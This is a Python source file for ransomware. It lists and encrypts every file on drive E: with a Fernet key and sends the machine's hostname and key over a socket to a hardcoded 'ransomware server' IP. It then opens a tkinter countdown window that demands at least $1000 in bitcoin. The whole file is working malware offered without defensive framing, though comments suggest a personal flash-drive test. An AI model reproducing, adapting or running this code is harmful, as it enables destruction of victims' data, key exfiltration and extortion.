# List all extensions in Drive
import os
import pandas as pd
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
from cryptography.fernet import Fernet

#drive = input('Drive to be encrypted: ').upper()
#ListFiles = os.walk(str (drive+':\\'))
ListFiles = os.walk(str('E:'))
SplitTypes = []
for walk_output in ListFiles:
    for file_name in walk_output[-1]:
        SplitTypes.append(str('.')+file_name.split(".")[-1])
SplitTypes
df = pd.DataFrame(SplitTypes, columns = ['extension_names'])
# Get unique values
uv = df.extension_names.unique()

# File extensions to encrypt 
encrypted_ext = (uv)
encrypted_ext
file_paths = []
for root, dirs, files in os.walk('E:'): # (E:) is my flash drive
    for file in files: 
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)
print(file_paths)
q = Queue()

# Encrypt files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Encrypting {file}')
        print(f'{file} SUCCESSFULLY ENCRYPTED')   
        try:
            with open('thekey.key', 'wb') as thekey:
                thekey.write(key)
            for file in file_paths:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_encrypted)
        except: # files with admin priviledges are skipped
            print('ENCRYPTION FAILED')
        q.task_done()


# connect to ransomware server to transfer key and hostname
ipaddr = '192.168.246.138' # computers ipv4 address
port = 5678


# grab hostname
hostname = os.getenv('COMPUTERNAME')


# grab all files from the machine
file_paths = []
for root, dirs, files in os.walk('E:'): # (E:) is my flash drive
    for file in files: 
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)
print('Successfully located all files!')
#for f in file_paths:
#    print(f)


# Generate encryption key
print('Generating encryption key')
key = Fernet.generate_key()
print('Key Generated!!!!!!!')

# Connect to server to transfer key and hostname
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ipaddr, port))
    print('Successfully connected.... transmitting hostname and key')
    s.send(f'[{time}] - {hostname} : {key}'.encode('utf-8'))
    print('finished transmitting data')
    s.close()  
# store files into a queue for threads to handle
for file in file_paths:
    q.put(file)

# setup threads to get ready for encryption    
thread = Thread(target=encrypt, args=(key,), daemon=True)
thread.start()
    
q.join()
print('ENCRYPTION AND UPLOAD COMPLETE')






### PAYMENT POP-UP/COUNTDOWN
from tkinter import *
import tkinter
from PIL import Image, ImageTk

#GLOBAL VARS
root, font, bg, fg = Tk(), ("Century Gothic", 15), "#333", "#fff"

#WINDOW CONFIGURES
root.geometry("800x800")
root.title("countdown")

# Create a StringVar for the countdown label and the time entry widget
count_text = StringVar()
time_text = StringVar()

class Example(Frame):
    def __init__(self, master, *pargs):
        Frame.__init__(self, master, *pargs)

        self.image = Image.open("./glow.png")
        self.img_copy = self.image.copy()

        self.background_image = ImageTk.PhotoImage(self.image)

        self.background = Label(self, image=self.background_image)
        self.background.pack(fill=BOTH, expand=YES)
        self.background.bind("<Configure>", self._resize_image)

    def _resize_image(self, event):
        new_width = event.width
        new_height = event.height

        self.image = self.img_copy.resize((new_width, new_height))

        self.background_image = ImageTk.PhotoImage(self.image)
        self.background.configure(image=self.background_image)


e = Example(root)
e.pack(fill=BOTH, expand=YES)



def set_timer():
   
    global H , S , M
   
    H , M , S = get_seconds.get().split(':')

def countdown():

    Start_btn['stat'] = 'disabled'
    
    global S , M , H

    if  int(M) != 0 and int(H) != 0:
        H = int(H)
        M =int(M) 
        S = 59
        M = 59
        H -=1
        M -= 1

    if int(S) == 0 and int(H) == 0 and int(M) == 0 :

        Start_btn['stat'] = 'normal'

        count_lb['text'] = "00:00:00"
        
        H , S , M = 0,0,0 
        #here you can add something to happen when count hit's 0 like an alerting sound
    elif int(S) == 0 :

        S = 59
        M = int(M)
        M -=1
        count_lb['text'] = "%s:%s:%s" % (H , int(M) , S ) 

        countdown()       
   
    else:
        
        timz = ( str(int(H)).zfill(2) , str(int(M)).zfill(2) , str(S).zfill(2))
        
        time_str = '%s:%s:%s' % timz 

        count_lb['text'] = time_str

        S = int(S) -1

        count_lb.after(1000,countdown)


def launch():

    set_timer()

    countdown()

count_lb = Label(root, text = "00:00:00", fg=fg, bg = "#000", font = (font[0], 40))
count_lb.place(relx= 0.00, rely = 0.5, relwidth = 0.55, relheight = 0.06)


get_seconds = Entry(root, font =('calibri', 30, 'bold'), justify=CENTER)
get_seconds.place(relx= 0.00, rely = 0.569, relwidth = 0.55, relheight = 0.06)
get_seconds.insert(0,"01:00:00")


Start_btn= Button(root, text = "LET THE GAME BEGIN LOL", command = launch, bg = '#008080', font=('Times', 25, 'bold'), relief ='flat')
Start_btn.place(relx= 0.00, rely = 0.647, relwidth = 0.55, relheight = 0.06)
Start_btn.invoke()

btc = Label(root, text = "Please send atleast $1000 worth of bitcoin here:", fg = '#00FF00', bg = '#000000', font=('Times', 15, 'bold'), relief ='flat' )
btc.place(relx= 0.00, rely = 0.730, relwidth = 0.55, relheight = 0.03)

lbl = Label(root, text = "xlcmvjbbrnrbuwesdbjvkdsfsyusdgs", fg = '#000000', bg = '#F5F5F5', font=('Times', 10, 'bold'), relief ='flat' )
lbl.place(relx= 0.00, rely = 0.780, relwidth = 0.55, relheight = 0.03)


root.mainloop() 